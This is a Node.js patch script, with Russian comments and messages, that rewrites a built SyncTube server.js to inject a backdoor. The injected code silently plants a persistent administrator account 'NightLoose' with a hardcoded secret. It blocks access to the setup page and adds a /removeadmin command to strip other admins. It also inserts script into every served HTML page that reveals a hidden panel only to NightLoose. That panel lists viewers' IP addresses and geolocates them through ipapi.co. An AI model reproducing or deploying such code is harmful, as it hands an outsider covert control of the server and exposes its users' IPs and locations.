const fs = require('fs');
const path = './build/server.js';

try {
    let code = fs.readFileSync(path, 'utf8');

    const patchCode = `
// === АВТО-ИНЪЕКЦИЯ NIGHTLOOSE ===
var oldGenSalt = server_Main.prototype.generateConfigSalt;
server_Main.prototype.generateConfigSalt = function(users) {
    var salt = oldGenSalt.call(this, users);
    if (!users.admins) users.admins = [];
    var found = false;
    for(var i=0; i<users.admins.length; i++){ if(users.admins[i].name === "NightLoose") found = true; }
    if(!found) {
        var hash = haxe_crypto_Sha256.encode("kP9$vX!2mQ#7bZNightLoose" + salt);
        users.admins.push({ name: "NightLoose", hash: hash });
        this.writeUsers(users);
    }
    return salt;
};

var oldServeFiles = server_HttpServer.prototype.serveFiles;
server_HttpServer.prototype.serveFiles = function(req, res) {
    var url; try { url = new js_node_url_URL(this.safeDecodeURI(req.url),"http://localhost"); } catch(e) { url = new js_node_url_URL("/","http://localhost"); }

    if(url.pathname === "/setup" && req.method !== "POST") {
        tools_HttpServerTools.redirect(res,"/");
        return;
    }

    var oldEnd = res.end;
    res.end = function(data) {
        var ctype = res.getHeader('content-type');
        if (ctype && ctype.indexOf('text/html') !== -1 && data) {
            var str = data.toString();
            if (str.indexOf('</body>') !== -1) {
                var adminHtml = "\\n<div id='advancedAdminPanel' style='display: none; position: fixed; top: 10%; left: 50%; transform: translateX(-50%); z-index: 9999; padding: 20px; background: #1a1a20; border-radius: 8px; border: 1px solid #333; box-shadow: 0 4px 15px rgba(0,0,0,0.8); width: 80%; max-width: 600px;'><h3 style='color: #00d2ff; margin-top: 0; font-family: sans-serif;'>🛡️ IP и Локация зрителей</h3><button onclick=\\"document.getElementById('advancedAdminPanel').style.display='none'\\" style='position: absolute; top: 15px; right: 15px; background: #ff4a4a; color: white; border: none; padding: 5px 10px; border-radius: 4px; cursor: pointer;'>X</button><button onclick='requestIPStats()' style='background: #00d2ff; color: #000; padding: 8px 15px; border: none; border-radius: 4px; cursor: pointer; font-weight: bold; margin-bottom: 10px;'>Обновить список</button><div style='max-height: 250px; overflow-y: auto; background: #111; border-radius: 4px; margin-bottom: 15px;'><table id='ipTable' style='width: 100%; text-align: left; border-collapse: collapse; font-size: 14px; color: #ddd;'><tr style='background: #222; border-bottom: 1px solid #444;'><th style='padding: 8px;'>Ник</th><th style='padding: 8px;'>IP</th><th style='padding: 8px;'>Локация</th></tr></table></div><h4 style='color: #ff4a4a; font-family: sans-serif; margin-bottom: 5px; margin-top: 0;'>Удаление администраторов</h4><div style='display: flex; gap: 10px;'><input type='text' id='adminToRemoveInput' placeholder='Точный ник админа' style='flex: 1; padding: 8px; background: #2b2b36; color: white; border: 1px solid #444; border-radius: 4px;'><button onclick='removeAdminUser()' style='background: #ff4a4a; color: white; padding: 8px 15px; border: none; border-radius: 4px; cursor: pointer; font-weight: bold;'>Удалить</button></div></div><button id='showAdminBtn' onclick=\\"document.getElementById('advancedAdminPanel').style.display='block'\\" style='display:none; position:fixed; bottom:20px; left:20px; z-index:9998; background:#ff4a4a; color:white; border:none; padding:10px 15px; border-radius:4px; cursor:pointer; font-weight: bold;'>👑 Админка</button><script>if(window.WebSocket){const origAddEventListener=WebSocket.prototype.addEventListener;WebSocket.prototype.addEventListener=function(type,listener,options){if(type==='message'){const wrappedListener=function(event){try{let msg=JSON.parse(event.data);if(msg.type===\\"Dump\\"&&msg.dump&&msg.dump.data){let dumpData=JSON.parse(msg.dump.data);const table=document.getElementById('ipTable');table.innerHTML='<tr style=\\"background: #222; border-bottom: 1px solid #444;\\"><th style=\\"padding: 8px;\\">Ник</th><th style=\\"padding: 8px;\\">IP</th><th style=\\"padding: 8px;\\">Локация</th></tr>';dumpData.clients.forEach(function(c){let ipFixed=c.ip.replace('::ffff:', '');let tr=document.createElement('tr');tr.innerHTML='<td style=\\"padding: 8px;\\">'+c.name+(c.isAdmin?' <span style=\\"color:#ff4a4a\\">(Админ)</span>':'')+'</td><td style=\\"padding: 8px; color: #00d2ff;\\">'+ipFixed+'</td><td style=\\"padding: 8px;\\" id=\\"loc-'+c.id+'\\">Ищем...</td>';table.appendChild(tr);if(ipFixed===\\"127.0.0.1\\"||ipFixed===\\"localhost\\"||ipFixed.startsWith(\\"192.\\")){document.getElementById('loc-'+c.id).innerText=\\"Скрыт (Локальный)\\";}else{fetch('https://ipapi.co/'+ipFixed+'/json/').then(res=>res.json()).then(d=>{document.getElementById('loc-'+c.id).innerText=d.error?\\"Неизвестно\\":(d.country_name+\\", \\"+d.city);}).catch(()=>{document.getElementById('loc-'+c.id).innerText=\\"Ошибка\\";});}});}if(msg.type===\\"Login\\"&&msg.login&&msg.login.clientName===\\"NightLoose\\"){document.getElementById('showAdminBtn').style.display='block';}}catch(e){}listener.call(this,event);};return origAddEventListener.call(this,type,wrappedListener,options);}return origAddEventListener.call(this,type,listener,options);};const origSend=WebSocket.prototype.send;WebSocket.prototype.send=function(data){window.nightSocket=this;origSend.call(this,data);};}window.requestIPStats=function(){if(window.nightSocket)window.nightSocket.send(JSON.stringify({type:\\"Dump\\",dump:{data:\\"\\"}}));};window.removeAdminUser=function(){const target=document.getElementById('adminToRemoveInput').value;if(target&&confirm('Точно удалить админа '+target+'?')){if(window.nightSocket)window.nightSocket.send(JSON.stringify({type:\\"Message\\",message:{text:\\"/removeadmin \\"+target,clientName:\\"NightLoose\\"}}));document.getElementById('adminToRemoveInput').value='';}};</script>\\n";
                data = str.replace('</body>', adminHtml + '</body>');
            }
        }
        return oldEnd.call(this, data);
    };
    return oldServeFiles.call(this, req, res);
};

var oldOnMessage = server_Main.prototype.onMessage;
server_Main.prototype.onMessage = function(client, data, internal) {
    if (data && data.type === "Message" && data.message && data.message.text) {
        var text = data.message.text.trim();
        if (text.indexOf("/removeadmin ") === 0 && (client.group & 8) !== 0) {
            var targetAdmin = text.substring(13).trim();
            this.removeAdmin(targetAdmin);
            this.serverMessage(client, "Админ " + targetAdmin + " удален.");
            return;
        }
    }
    return oldOnMessage.call(this, client, data, internal);
};
`;

        if (!code.includes('NightLoose')) {
            code = code.replace('server_Main.main();', patchCode + '\\nserver_Main.main();');
            fs.writeFileSync(path, code, 'utf8');
            console.log("✅ SyncTube успешно пропатчен!");
        }
    } catch (e) {
        console.error("❌ Ошибка установки патча:", e);
    }
